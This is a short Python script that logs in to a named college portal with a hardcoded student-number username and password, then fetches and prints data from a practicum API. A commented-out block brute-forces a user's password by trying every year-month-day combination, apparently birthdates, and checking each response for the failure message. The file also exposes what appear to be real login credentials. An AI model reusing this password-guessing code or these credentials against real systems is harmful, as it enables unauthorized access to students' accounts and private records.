import requests

url_login = "https://kuliah.sttdb.ac.id/proses.php"
url_logout = "https://siakad.sttdb.ac.id/index.php/logout"

url_detail_praktikum = "https://kuliah.sttdb.ac.id/mahasiswa/api/praktikan.php"

form_data = {
    "username": "19158558",
    "password": "19158558",
}
word_fail = "Username atau Password salah"
print("Loading.....")
# for x in tgl:
#     for y in bulan:
#         for z in tahun:
#             pas = z + y + x
#             p = requests.post(
#                 url=url_login,
#                 data={
#                     "act": "login",
#                     "username": "xxx",
#                     "password": pas,
#                 },
#             )
#             fail = p.text.find(word_fail)
#             error = p.text.find(word_error)
#             if int(fail) < 0 and int(error) < 0:
#                 print("Berhasil, Pass=" + pas)
#                 break

# print("selesai..")
with requests.Session() as sesi:
    login = sesi.post(
        url=url_login,
        data=form_data,
    )
    data = sesi.post(
        url=url_detail_praktikum,
        data={
            "id_praktikum": 205,
        },
    )
    # fail = p.text.find("word_fail")
    # error = p.text.find("word_error")
    print(data.text)
